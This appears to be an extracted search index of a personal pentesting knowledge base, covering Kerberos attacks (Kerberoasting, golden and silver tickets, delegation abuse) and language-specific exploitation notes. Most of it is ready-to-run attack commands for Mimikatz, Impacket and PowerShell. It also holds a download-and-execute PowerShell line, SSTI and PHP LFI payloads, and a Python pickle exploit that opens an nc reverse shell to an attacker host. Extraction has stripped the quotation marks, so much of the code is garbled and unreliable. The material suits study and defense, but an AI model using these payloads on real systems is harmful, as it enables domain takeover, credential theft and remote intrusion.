powershell_import / root / Find-PSServiceAccounts . ps1 powershell_execute Find-PSServiceAccounts Empire: usemodule situational_awareness / network / get_spn PowerShellery Part of: https://github.com/nullbind/Powershellery Get-SPN -type service -search * -List yes | Format-Table Get-SPN -type service -search * Get UserSID, the service and the actual User. Import-Module .\\ Get-DomainSpn . psm1 Get-DomainSpn Impacket Valid domain credentials are required for communication with the Active Directory as token based authentication cannot be used. ./ GetUserSPNs . py -dc-ip 10 . 0 . 0 . 1 pentestlab . local / test","title":"Step 1 - Service Provider Name (SPN) and SPN Discovery"},{"location":"iam-kerberos/#step-2-request-service-tickets","text":"Request is sent to the KDC , hence it's not required that service is accessible, available or even exit anymore. Request the service ticket for a specific SPN: Add-Type -AssemblyName System . IdentityModel New-Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken -ArgumentList PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80 Alternatively, use Mimikatz by specifing target as the service principal name: kerberos :: ask / target : PENTESTLAB_001 / WIN - PTELU2U07KG . PENTESTLAB . LOCAL : 80 List all available cached tickets: klist Invoke-Mimikatz -Command kerberos::list load kiwi kerberos_ticket_list kiwi_cmd kerberos :: list Request Kerberos service tickets that belong to domain users only which should be easier to cracked compared to computer accounts service tickets (requires valid domain credentials in order to interact with the Active Directory since it will executed from a system that is not part of a domain): ./ GetUserSPNs . py -request pentestlab . local / test Automatically identify weak service tickets based on user account and password expiry (RiskySPN: https://github.com/cyberark/RiskySPN ): Find-PotentiallyCrackableAccounts -FullData -Verbose All user accounts that have an associated SPN: Find-PotentiallyCrackableAccounts -Domain pentestlab.local Export to CVS (offline cracking): Export-PotentiallyCrackableAccounts Get service tickets for service instance by its SPN: Get-TGSCipher -SPN PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80 Various functions that can be executed to request, list and export service tickets: Auto-Kerberoast List-UserSPNs List-UserSPNs -Domain pentestlab.local Mass request tickets (ticket for each account) Add-Type -AssemblyName System . IdentityModel setspn . exe -T lab . local -Q */- | Select-String ^CN -Content 0 , 1 | % { New-Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken -ArgumentList $_ . Context . PostContext [ 0 ]. Trim () } ./ GetUserSPNs . ps1 | % { New-Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken -ArgumentList $_ . ServicePrincipalName }","title":"Step 2 - Request Service Tickets"},{"location":"iam-kerberos/#step-3-export-service-tickets","text":"List all available tickets from memory and save in remote host: Invoke-Mimikatz -Command kerberos::list /export PowerShell Empire: usemodule credentials / mimikatz / extract_tickets standard :: base64 kerberos :: list / export Extract Ticket hashes for services that support Kerberos authentication: usemodule credentials / invoke_kerberoast AutoKerberoast will request and extract all the service tickets in base64 format. Invoke-AutoKerberoast Invoke-AutoKerberoast -GroupName Domain Admins -Domain pentestlab . local -HashForm Extract hashed in different formats (John, Hashcat and Kerberoast) - eliminates the need of Mimikatz for ticket export Get-TGSCipher -SPN PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80 -Format John Extract TGT responses from PCAP: extracttgsrepfrompcap . py","title":"Step 3 - Export Service Tickets"},{"location":"iam-kerberos/#step-4-crack-service-tickets","text":"Crack ticket: python tgsrepcrack . py / root / Desktop / passwords . txt PENTESTLAB_001 . kirbi Extract the Hash from Service Ticket python extractServiceTicketParts . py PENTESTLAB_001 . kirbi tgscrack . exe - hashfile hash . txt - wordlist passwords . txt If PowerShell remoting is enabled then the password that has been retrieved from the service ticket can be used for execution of remote commands and for other lateral movement operations. Enable-PSRemoting $pass = Password123 | ConvertTo-SecureString -AsPlainText -Force $creds = New-Object System . Management . Automation . PSCredential -ArgumentList PENTESTLAB_001 , $pass Invoke-Command -ScriptBlock { get-process } -ComputerName WIN-PTELU2U07KG . PENTESTLAB . LOCAL -Credential $creds Dump returned service account with its correlating password hash: powershell -ep bypass -c IEX (New-Object System.Net.WebClient).DownloadString( https://raw.githubusercontent.com/nettitude/PoshC2/master/Modules/powerview.ps1 Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash1.txt hashcat64 . exe -m 13100 C:\\Hash1.txt C : \\ Rocktastic12a - -outfile = C:\\OutputHash1.txt `","title":"Step 4 - Crack Service Tickets"},{"location":"iam-kerberos/#step-5-rewrite-service-tickets-ram-injection","text":"Kerberos tickets are signed with the NTLM hash of the password. If the ticket hash has been cracked then it is possible to rewrite the ticket with Kerberoast python script. Allow: Impersonate any domain user when the service is going to be accessed. Privilege escalation is also possible as the user can be added into an elevated group such as Domain Admins. python kerberoast . py -p Password123 -r PENTESTLAB_001 . kirbi -w PENTESTLAB . kirbi -u 500 python kerberoast . py -p Password123 -r PENTESTLAB_001 . kirbi -w PENTESTLAB . kirbi -g 512 Also fake account. Use Mimikatz to generate ticket (change RID of the account to 1106): kerberos :: golden / domain : lab . local / sid : sid / groups : 123 , 124 , 125 / target : target . local / service : MSSQLSvc / ticket : target . local . kirbi / rc4 : service s hash / ppt / id : 1106 / user : tm / ppt will directly inject the fake account into memory. / id and / user can be invalid values, so that logs will be useless / groups can be altered to add user to domain-admin The new ticket can be injected back into the memory with kerberos :: ptt PENTESTLAB . kirbi","title":"Step 5 - Rewrite Service Tickets &amp; RAM Injection"},{"location":"iam-kerberos/#defense","text":"Use *- ADServiceAccount cmdlet to create service accounts Pick really random, good passwords (25+ chars ) Monitor DC for bursts of Service Ticket requests (Event ID 4769) Force services to verify PAC - Doesn't prevent cracking - Prevent writing - Can impact performance","title":"Defense"},{"location":"iam-kerberos/#pass-the-key","text":"","title":"Pass the key"},{"location":"iam-kerberos/#pass-the-ticket","text":"The process of forging a session key and presenting that forgery to the resource as credentials","title":"Pass the ticket"},{"location":"iam-kerberos/#silver-ticket","text":"Silver Ticket: A forged ticket that grants access to a serviceCredential stuffing. Password hashes of service accounts could be used to create Kerberos session ticket (TGS) has a sever portion which is encrypted with the password hash of the service account. Can request a ticket and do offline brute forcing. https://drive.google.com/open?id=1iSXKVgkO_U61MCf0ItaZgyMt-406pWdD KDC does not handle authorization Can request TGS for any service TGS is encrypted using target-service NTLM hash .:. it is possible to brute-force the TGS to get target-service account credentials Find Service Accounts GetUserSPNs - https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py PowerView (SPN = Service Principal Name) Get-Netuser -SPN ActiveDirectory Module Install-ActiveDirectoryModule -DllPath C : \\ AdModule \\ Microsoft . ActiveDirectory . Management . dll ADModulePath C : \\ AdModule \\ ActiveDirectory . psd1 Get-ADUser -Filter { ServicePrincipalName -ne $null } -Properties ServicePrincipalName Request SPN Ticket Add-Type -AssemblyName System . IdentityModel New-Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken -ArgumentList server-name - PowerView Request-SPNTicket Save Tieket List all tickets in cache (check if granted): klist Mimikatz: Invoke - Mimikatz - Command kerberos::list /export Bruteforce tgsrepcrack or use John python . exe . \\ tgsrepcrack . py . \\ password . txt ticket","title":"Silver Ticket"},{"location":"iam-kerberos/#golden-ticket","text":"Golden Ticket: A ticket that grants a user domain admin access Ticket not made by KDC (ticket is self-made) Not limited by GPO Smart-card independent Hence, it's possible to push anything Since we have krbtgt Can modify PAC Group ID, SID, Username Kerberos is stateless All account policy is client side enforcement Disabled / Expiry / Logon hours Silo memberships Protected Users and other group memberships With Kerberos 5 - TGS / KDC has no way of validating that account is still valid when presented with TGT. Microsoft implement: If TGT is older than 20 mins the TGS will validate the account with KDC when issuing a service ticket. Account validity and check enabled state is checked. However, with Golden Ticket we issuer our own TGT. Therefore, it is possible to issue TGT with recent issued-times to bypass this check. Why attack on TGT, but not on TGS? Service account passwords are rotated every 30-40 days. Krbtgt account password is never changed. A singled TGT can get many TGS. Ticket Encryption PAC KDC Signature PAC Server Signature TGT krbtgt krbtgt krbtgt TGS target krbtgt target Generating \"Golden Ticket\" requires: KDC key (krbtgt) SID of the domain (whom, psgetsid) Domain name lsadump :: lsa / inject / name : krbtgt kerberos :: golden / domain : domain / sid : domain - sid / rc4 : ntlm - hash - of - krbtgt / user : Administrator / id : 500 - RID of the user ( 500 is domain admin ) / groups : 513 , 512 , 520 , 518 , 519 / ticket : Administrator.kirbi - ticket filename","title":"Golden Ticket"},{"location":"iam-kerberos/#encryption-downgrade-with-skeleton-key-malware","text":"A malware that can bypass Kerberos, but the attack must have Admin access","title":"Encryption downgrade with Skeleton Key Malware"},{"location":"iam-kerberos/#dcshadow-attack","text":"A new attack where attackers gain enough access inside a network to set up their own DC to use in further infiltration","title":"DCShadow attack"},{"location":"iam-kerberos/#smart-card-authentication-with-dh-keys","text":"If certificate based authentication is required DH must be implemented (as per spec) RFC 4556 RFC 5349 Microsoft improved current protocol with draft: https://tools.ietf.org/html/draft-ietf-kitten-pkinit-freshness-07 https://datatracker.ietf.org/meeting/91/session/kitten https://datatracker.ietf.org/meeting/91/materials/slides-91-kitten-1.pdf In order for GPO to work full network should be aware of it ( Windows 10 2016) Detect using IPS rule to inspect AS - RE Q ( AS - REQ is now signed, not encrypted)","title":"Smart Card Authentication with DH Keys"},{"location":"iam-kerberos/#attacking-windows-pki","text":"Mimikatz can export Windows CA (NTAuth certificate store ) Ask PKI server to generate a raw certificate (with any required expiry and any required user) without CRLDP so that cert cannot be revoked.","title":"Attacking Windows PKI"},{"location":"iam-kerberos/#kerberos-delegation","text":"Allows reusing the end-user credentials to access resources hosted on a different server. Used when Kerberos Double Hop is required. Impersonating the incoming/authentication user is necessary to work. Types: Unconstrained (only Windows Server 2003 ) - Allow authentication to any service in the domain Constrained","title":"Kerberos Delegation"},{"location":"iam-kerberos/#unconstrained-kerberos-delegation","text":"- https://drive.google.com/open?id=1VZvQcin4RN7PkByplk-LhI1P3mrCoJXY User provide credentials to DC DC returns TGT User request TGS for web service DC provides TGS (TGS contains user's TGT) User sends TGT and TGS to web Server Same as usual up to this point Web server service account use user's TGT to request a TGS got database server from DC - Web server service account can decrypt TGS and extract the user's TGT - This is because TGS is encryoted with web server service account's NTLM hash Web server service account connects to database impersonating the user When allowed to a paticular service-account, allows delegation to any service in domain by impercenating incoming user because DC place user's TGT in TGS (step 4) In example: web server service account can request access to any service in domain as user connecting to it Usable to escalate privilages (if webserver can be comprimzed) When a domian admin / high privilaged user connect to machine (Ex: webserver) Identifying Nodes with Unconstrained Delegation Enabled Get - NetComputer - UnConstrained Get - ADComputer - Filter { TrustedForDelegation - eq $ True } Get - ADUser - Filter { TrustedForDelegation - eq $ True } Attack Pattern Compromise the server that use unconstrained delegation Wait for a high privileged connect Once connected, export all the tickets including TGT for that User Invoke - Mimikatz - Command sekurlsa::tickets /export Reuse tickets with Invoke - Mimikatz - Command kerberos::ppt C:\\tickets\\admin.kirbi","title":"Unconstrained Kerberos Delegation"},{"location":"iam-kerberos/#constrained-kerberos-delegation","text":"Only provide access to specified services on a specifiv computer Service account must have TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl attribute Service account can asccess all services specified in msDS - AllowedToDelegateTo attribute Abuse possibllities: Student authenticate using non-kerberos auth and Protocol Transition is used by Kerberos to support SSO Delegation occurs ont only got specifid service but for any service running under the same account No validation for the specific SPN https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/ Delegation is not restricted by SPN. It's possible to create alternate tickets. Identifying Users with Unconstrained Delegation Enabled Get-DomainUser -TrustedToAuth Get-DomainComputer -TrustedToAuth Install-ActiveDirectoryModule -DllPath C : \\ AdModule \\ Microsoft . ActiveDirectory . Management . dll ADModulePath C : \\ AdModule \\ ActiveDirectory . psd1 Get-ADObject -Filter { msDS-AllowedToDelegateTo -ne $null } -Properties msDS-AllowedToDelegateTo Get cleartext password or NTLM hash of the service account. Use the above, with Kekeo to get TGT asktgt . exe / user : exadmin / domain : example . powershell . local / key : deadbeefdeadbeefdeadbeef / ticket : exadmin . kirbi Use TGT to get TGS: Retquest a TGS as the user / user : Administrator \\ s4u . exe / tgt : axadmin . kribi / user : Administrator @example . powershell . local / service : cifs / example1 . powershell . local Use TGT Invoke - Mimikatz - Command kerberos:ppt example.kribi ls \\\\ example . powershell . local \\ c $","title":"Constrained Kerberos Delegation"},{"location":"iam-kerberos/#tools","text":"A little toolbox to play with Microsoft Kerberos in C: https://github.com/gentilkiwi/kekeo/ C# toolset for raw Kerberos interaction and abuses: https://github.com/GhostPack/Rubeus","title":"Tools"},{"location":"iam-kerberos/#references","text":"https://docs.microsoft.com/en-us/windows/desktop/secauthn/authentication-portal https://docs.microsoft.com/en-us/windows/desktop/secauthn/microsoft-kerberos https://drive.google.com/open?id=1eaQki6QuqfbHqMfkaKH66z2OAnI0lV0H Tim Medin - Attacking Kerberos: Kicking the Guard Dog of Hades","title":"References"},{"location":"iam-kerberos/#new-references","text":"Kerberos Attacks 101: https://www.youtube.com/watch?v=IBeUz7zMN24 feature=youtu.be Attacking Microsoft Kerberos Kicking the Guard Dog of Hades Tim Medin https://blog.redforce.io/oh-my-kerberos-do-not-get-kerberoasted/ https://www.tarlogic.com/en/blog/how-kerberos-works/ https://www.tarlogic.com/en/blog/how-to-attack-kerberos/","title":"New References"},{"location":"iam/","text":"IAM Kerberos Moved to dedicated section at https://kbase.ayoma.me/iam-kerberos/ JWT jku can be changed to a different URL, so that the validator will pick the key material from attacker controlled endpoint. (Ref: AttackDefense - JWT CTF) References Stop using JWT for sessions: http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/ No Way, JOSE! Javascript Object Signing and Encryption is a Bad Standard That Everyone Should Avoid: https://paragonie.com/blog/2017/03/jwt-json-web-tokens-is-bad-standard-that-everyone-should-avoid OAuth2 Bug Reports Twitter: Insufficient OAuth callback validation which leads to Periscope account takeover: https://hackerone.com/reports/110293","title":"IAM"},{"location":"iam/#iam","text":"","title":"IAM"},{"location":"iam/#kerberos","text":"Moved to dedicated section at https://kbase.ayoma.me/iam-kerberos/","title":"Kerberos"},{"location":"iam/#jwt","text":"jku can be changed to a different URL, so that the validator will pick the key material from attacker controlled endpoint. (Ref: AttackDefense - JWT CTF) References Stop using JWT for sessions: http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/ No Way, JOSE! Javascript Object Signing and Encryption is a Bad Standard That Everyone Should Avoid: https://paragonie.com/blog/2017/03/jwt-json-web-tokens-is-bad-standard-that-everyone-should-avoid","title":"JWT"},{"location":"iam/#oauth2","text":"Bug Reports Twitter: Insufficient OAuth callback validation which leads to Periscope account takeover: https://hackerone.com/reports/110293","title":"OAuth2"},{"location":"languages/","text":"Esoteric Languages Malbolge compiler: https://www.tutorialspoint.com/execute_malbolge_online.php Brainfuck Interpreter: https://sange.fi/esoteric/brainfuck/impl/interp/i.html Piet Interpreter: https://www.bertnase.de/npiet/npiet-execute.php .Net Compiling cs files: C : \\ Windows \\ Microsoft . NET \\ Framework64 \\ v4 . 0 . 30319 \\ csc . exe test . cs Enabling debug: Src in C : \\ inetpub \\ wwwwroot \\ eample \\ bin \\ example . dll is loaded to C : \\ Windows \\ Microsoft . NET \\ Framework64 \\ v4 . 0 . 30319 \\ Temporary ASP . NET Files \\ example \\ dnSpy (Edit Assembly Attributes (C#)) Making an Image Easier to Debug: https://github.com/dnSpy/dnSpy/wiki/Making-an-Image-Easier-to-Debug From: [ assembly : Debuggable ( DebuggableAttribute . DebuggingModes . IgnoreSymbolStoreSequencePoints )] To: [ assembly : Debuggable ( DebuggableAttribute . DebuggingModes . Default | DebuggableAttribute . DebuggingModes . DisableOptimizations | DebuggableAttribute . DebuggingModes . IgnoreSymbolStoreSequencePoints | DebuggableAttribute . DebuggingModes . EnableEditAndContinue )] Compile and Save Module Debug Attach w3wp.exe Pause Debug Windows Modules Right Click - Open All Modules https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-debug-dotnet-framework-source?view=vs-2019 https://www.domstamand.com/debugging-your-dotnet-applications-and-packages-howto/ Deserialization Ref: https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization https://github.com/pwntester/ysoserial.net System.Windows.Data.ObjectDataProvider https://docs.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?redirectedfrom=MSDN view=netframework-4.7.2 Inherits DataSourceProvider PresentationFramework.dll (C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\WPF) Wrap an arbitrary object use the MethodName property to call a method use the MethodParameters property to pass parameters BinaryFormatter - Serializes and deserializes an object, or an entire graph of connected objects, in binary format https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=netcore-3.1 viewFallbackFrom=netframework-%204.7.2 BinaryFormatter is insecure and can't be made secure. BinaryFormatter security guide: https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide XML serialization: https://docs.microsoft.com/en-us/dotnet/standard/serialization/introducing-xml-serialization ObjectDataProvider: https://docs.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?view=netcore-3 Use the ConstructorParameters property to pass parameters to the constructor of your object. Use the MethodName property to call a method and use the MethodParameters property to pass parameters to the method. You can then bind to the results of the method. ExpandedWrapper: https://docs.microsoft.com/en-us/dotnet/api/system.data.services.internal.expandedwrapper-2?view=netframework-4.7.2 https://referencesource.microsoft.com/#System.Data.Services/System/Data/Services/Internal/ExpandedWrapper.cs https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/projection-operations http://oakleafblog.blogspot.com/2010/07/windows-azure-and-cloud-computing-posts_22.html Videos - Alvaro Mu\u00f1oz: .NET Serialization: Detecting and defending vulnerable endpoints: https://www.youtube.com/watch?v=qDoBlLwREYk C / C++ Unsafe functions strcpy strcat GO Environment Setup Preparing Your Environment For Go Development: https://www.gopherguides.com/courses/preparing-your-environment-for-go-development?utm_source=twitter utm_campaign=install utm_medium=twitter References https://github.com/parsiya/Hacking-with-Go https://www.blackhat.com/docs/asia-17/materials/asia-17-Clapis-Go-Get-My-Vulnerabilities-An-In-Depth-Analysis-Of-Go-Language-Runtime-And-The-New-Class-Of-Vulnerabilities-It-Introduces.pdf Java Simple steps to create Jar javac -source 1 .8 -target 1 .8 test.java mkdir META-INF echo Main-Class: test META-INF/MANIFEST.MF jar cmvf META-INF/MANIFEST.MF test.jar test.class java -jar test.jar Debug -Xdebug -Xnoagent -Xrunjdwp:transport = dt_socket,address = 8787 ,server = y ,suspend = n jdb -attach example:8787 jdb -sourcepath . -attach example:8787 # jdb with the sourcepath stop in full package . class . method list # add to tomcat-verison/bin/startup.sh export JPDA_ADDRESS = 8000 export JPDA_TRANSPORT = dt_socket # modify last line to exec $PRGDIR / $EXECUTABLE jpda start $@ Deserialization https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet Decode serialized data: https://github.com/NickstaDB/SerializationDumper https://www.youtube.com/watch?v=KSA7vUkXGSg Deserialization: what, how and why [not] - Alexei Kojenov - AppSecUSA 2018: https://www.youtube.com/watch?v=t-zVC-CxYjw Very good basic introduction Death by deserialization: https://youtu.be/t-zVC-CxYjw?t=1155 Automated Discovery of Deserialization Gadget Chains: https://www.youtube.com/watch?v=MTfE2OgUlKc History of important sessions: https://youtu.be/MTfE2OgUlKc?t=309 Basic example to magic methods (hashCode example) to Gadget chains https://github.com/JackOfMostTrades/gadgetinspector Libraries Commons Collection: https://gursevkalra.blogspot.com/2016/01/ysoserial-commonscollections1-exploit.html Conjure Scala-Library Conjure2 New Exploit Technique In Java Deserialization Attack: https://www.youtube.com/watch?v=Lv9BC_bYaI8 CVE-2019-1040 - NTLM reflection attack CVE-2019-2426 - ntlm leaking https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html Defense Look ahead check JEP290 - Filter Incoming Serialization Data Runtime application self protection (RASP) Java-Agent Tools https://github.com/JackOfMostTrades/gadgetinspector Enum class hierarchy Discover passthrough dataflow Enum passthrough callgraph Enum source using known tricks ( entry points into gadget-chains ) HashCode DynamicProxy BFS on call graph for chains https://github.com/frohoff/ysoserial https://github.com/mbechler/marshalsec https://github.com/Contrast-Security-OSS/joogle https://github.com/federicodotta/Java-Deserialization-Scanner https://github.com/nccgroup/freddy References LLJVM - running comparatively low level languages (such as C) on the JVM: https://github.com/davidar/lljvm Java deserialization attacks: Java-Deserialization-Cheat-Sheet https://github.com/NickstaDB/SerializationDumper https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/ https://github.com/NickstaDB/DeserLab https://github.com/NickstaDB/BaRMIe JSF: https://bitbucket.org/gebl/viewstatemesser/src/master/ https://bitbucket.org/gebl/appseccali-jsf-el/src/master/ https://github.com/frohoff/inspector-gadget New Technologies Feign is a Java to HTTP client binder inspired by Retrofit, JAXRS-2.0, and WebSocket: https://github.com/OpenFeign/feign resilience4j: https://resilience4j.readme.io/docs/getting-started JavaScript Tools CharCode Translator: http://jdstiles.com/java/cct.html img src= x/ script eval(String.fromCharCode(CHARCODE_HERE)); /script NodeJS / JavaScript Look for eval () Tools Serialize an object including it's function into a JSON Contents for Node.Js Security Course References Eval Safe-Eval VM VM2: https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/ https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html Exploiting deserialization bugs in Node.js modules for Remote Code Execution Exploiting Node.js deserialization bug for Remote Code Execution Node.js Security: Pentesting and Exploitation \u2013 NJS https://github.com/ajinabraham/Node.Js-Security-Course https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/Web/node.js-deserialization.md https://www.vulnhub.com/entry/moonraker-1,264/ Node.Js Deserialization Attack \u2013 Detailed Tutorial 2018 Rails Rails' Remote Code Execution Vulnerability Explained RegEx References Regex tutorial\u200a\u2014\u200aA quick cheatsheet by examples: https://medium.com/factory-mind/regex-tutorial-a-simple-cheatsheet-by-examples-649dc1c3f285 Exploiting Regular Expressions: https://medium.com/@somdevsangwan/exploiting-regular-expressions-2192dbbd6936 Rust References Fearless Concurrency with Rust: https://blog.rust-lang.org/2015/04/10/Fearless-Concurrency.html Python Internals: Objects, Classes and Metaclasses - Above and Under the Hood: http://cben-hacks.sourceforge.net/python/lectures/metaclasses/metaclasses.html https://blog.usejournal.com/playing-with-inheritance-in-python-73ea4f3b669e ' Type vs Object: https://lerner.co.il/2015/10/18/pythons-objects-and-classes-a-visual-guide/ Script to inspect: https://github.com/PequalsNP-team/pequalsnp-team.github.io/blob/master/assets/search.py Debugging using ptvsd pip install ptvsd If Procfile is used disable start of web server automatically by commenting web : section Add following to app: import ptvsd ptvsd . enable_attach ( redirect_output = True ) print ( Waiting for debugger ) ptvsd . wait_for_attach () Get attributes and methods of a object: s = HELLO dir ( s ) __class__ attribute - type of object __mro__ attribute (Method Resolution Order)) - tuple of classes in the search order __subclasses__ returns a list of all the subclasses of a class __bases__ provides a tuple of immediate base classes of a class. SSTI https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti https://0day.work/jinja2-template-injection-filter-bypasses/ SSTI patterns: s . __class__ . __base__ . __subclasses__ () s . __class__ . __mro__ [ 1 ]. __subclasses__ () Searching: c = HELLO . __class__ . __base__ . __subclasses__ () for i in range ( len ( c )): print ( i , c [ i ] . __name__ ) for i in range ( len ( c )): n = c [ i ] . __name__ if n . find ( warning ) - 1 : # Find specific function name print ( i , n ) Common interesting functions: catch_warnings: s . __class__ . __base__ . __subclasses__ ()[ 100 ]. _module . __builtins__ [ __import__ ]( os ). system ( date ) read: s . __class__ . __base__ . __subclasses__ ()[ 100 ]( /etc/passwd ). read () popen: s . __class__ . __base__ . __subclasses__ ()[ 100 ]([ /usr/bin/touch , /tmp/example ]) Common sinks: flask . render_template_string ( source , ** context ) Vars: request session config g - globals May bruteforce with https://raw.githubusercontent.com/albinowax/SecLists/9309803f3f7d5c1e0b2f26721c1ea7ef36eeb1c8/Discovery/Web_Content/burp-parameter-names https://flask.palletsprojects.com/en/1.0.x/templating/#standard-context https://jinja.palletsprojects.com/en/master/templates/#builtin-globals First, inject something like {{ ''. class . mro [2]. subclasses () 40 .write(' '') }} into the SSTI vulnerability. Then, invoke the compilation process by injecting {{ config.from_pyfile('/tmp/owned.cfg') }}. The code will execute upon compilation. https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2/ Challenges https://www.hackingnote.com/en/python-challenge-solutions/level-5 Tools ZipApps - similar to JAR pipX - pip with virtual env Shiv - Modified ZipApp to work with C extensions Packaging: The bible of packaging python apps in docker Attack Vectors - Exploiting Imports - It is possible to create a .py file named with the name of the import. This will load the local file (same dir as the file importing the library) instead of the actual library. - cPickle RCE - Arbitrary code execution with Python pickles - Python Pickle Injection - https://penturalabs.wordpress.com/2011/03/17/python-cpickle-allows-for-arbitrary-code-execution/ - https://blog.nelhage.com/2011/03/exploiting-pickle/ - https://stackoverflow.com/questions/38307636/can-anyone-explain-me-the-example-of-an-exploit-in-python-s-pickle-module - HTB - DevOps - HTB - Challenge - Mics - Long Bottom's Locker - https://www.hackingnote.com/en/python-challenge-solutions/level-5 - Pickle formats: http://spootnik.org/entries/2014/04/05/diving-into-the-python-pickle-formatt/index.html #!/usr/bin/python3 import sys import pickle f = open ( sys . argv [ 1 ], rb ) mydict = pickle . load ( f ) f . close for line in mydict : print ( . join ([ k * v for k , v in line ])) for i in mydict : b = [] for x in i : #print x b . append ( x [ 0 ] * x [ 1 ]) print ( . join ( b )) import cPickle , requests , base64 LHOST = 10.10.14.14 LPORT = 31337 RHOST = 10.10.10.91 RPORT = 5000 class Payload ( object ): def __init__ ( self , cmd ): self . cmd = cmd def __reduce__ ( self ): import os return ( os . system , ( self . cmd ,)) reverse_sh = rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc %s %s /tmp/f % ( LHOST , LPORT ) evilpickle = cPickle . dumps ( Payload ( reverse_sh )) r = requests . post ( http:// %s : %s /newpost % ( RHOST , RPORT ), data = base64 . urlsafe_b64encode ( evilpickle )) print ( POST {} {} . format ( r . status_code , r . url )) Pickle to object: import pickle import base64 pickled = base64 . b64decode ( Value ) pickle . load ( pickled ) PHP Extensions: .php .php3 .php4 .php5 .php7 .phps .phtml .inc .phar Cheatsheets https://www.logicbig.com/tutorials/misc/php/php-advance-cheat-sheet.html http://overapi.com/php https://courses.cs.washington.edu/courses/cse154/18au/resources/cheatsheets/php-cheatsheet.pdf References dangerous-php-functions: https://alionder.net/dangerous-php-functions/ Understanding PHP Object Injection https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/ https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/ http://pentestmonkey.net/tools/web-shells/php-reverse-shell PHP Remote File Inclusion command shell using data:// Hardening and securing PHP on Linux HTTP Parameter Pollution with cookies in PHP Attack Vectors Terminate strings using null byte** Before PHP 5 . 3 terminate strings using null byte is possible (%00 in URL) http : // example . com ? param = .. / .. / .. / .. / etc / passed - / etc / passed . php http : // example . com ? param = .. / .. / .. / .. / etc / passed % 00 - / etc / passed Vulnerable Functions Local / Remote file inclusion bugs: include() include_once() require() require_once() Local / Remote command execution bugs: eval() preg_replace() fwrite() passthru() file_get_contents() shell_exec() system() SQL Injection bugs: mysql_query() File / File system bugs: fopen() readfile() glob() file() popen() exec() https://0xzoidberg.wordpress.com/2010/05/26/vulnerable-php-functions/ RCE with PREG Functions implement regular expressions for the preg_ functions (preg_match, preg_replace) / e modifier which allows evaluation of PHP code in the preg_replace Example: ?php $string = this is my lower sting ; print preg_replace ( /(.*)/e , strtoupper( \\\\1 ) , $string ); ? // THIS IS MY LOWER STING Example Attack: ?php $string = phpinfo() ; print preg_replace ( /^(.*)/e , strtoupper(\\\\1) , $string ); ? Filter Evasion: - Prevent single quote and escape chars Following will fail: $string = system( ls -lah ) ; Bypass: $string = `ls -lah` ; Ref: http://www.madirish.net/402 LFI with Filter Inclusion Useful when LFI is possible but \".php\" is appended at end (and not vulnerable to null byte injection) filter / convert . base64 - encode forces PHP to base64 encode the file before it is used in the require statement ( index \u200b . php ) http://example.com/?page=php://filter/convert.base64-encode/resource=index\u200b LFI with Zip Inclusion (Include a file inside a zip) If it is possible to upload a zip file http://example.com/?page=zip://uploads/zipfilename#shell.php?cmd=id LFI to RFI Possible if allow_url_include is on Type Juggling Magic hashes https://www.whitehatsec.com/blog/magic-hashes/ https://github.com/spaze/hashes Fixed in v7 (except for exponent) References: https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/ https://0xdf.gitlab.io/2018/06/23/htb-falafel.html#php-type-juggling-intro https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/ 0e1234 == 0e4321 0e1234 == 0 0e1234 = 1 0xf == 15 #0xf in hexadecimal notation is 15 000...000 == int(0) 0e0...000 == int(0) 1e0...000 == int(1) 0abc...000 == int(0) abc...000 == int(0) # if a string starts with a non numerical character it will default to int(0) var_dump( 2 bottles == 2); // == TRUE $values = array( apple , orange , pear , grape ); in_array(0, $values); // == TRUE if($password == secretpass ) // == TRUE when $password=0 Example: php $token = 0e124656823434657657655654324342 ; if(isset($_COOKIE[ token ]) $_COOKIE[ token ] == $token) { // access to privilege area } else { // login require } ? $COOKIE[\u2018token\u2019] == $token (\u20180e124656823434657657655654324342\u2019 == \u20180\u2019) will return TRUE 